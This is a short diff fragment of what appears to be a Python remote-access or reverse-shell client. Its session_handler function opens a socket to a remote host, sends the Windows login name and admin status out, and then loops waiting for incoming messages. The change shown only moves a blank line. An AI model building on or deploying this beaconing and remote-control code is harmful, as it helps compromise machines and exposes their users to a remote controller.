@@ -33,8 +33,8 @@ def session_handler():
     print(f'[+] Connecting to {host_ip}')
     sock.connect((host_ip, host_port))
     outbound_message(os.getlogin())
-
     outbound_message(ctypes.windll.shell32.IsUserAnAdmin())
+
     print(f'[+] Connected to {host_ip}')
     while True:
         message = inbound_message()
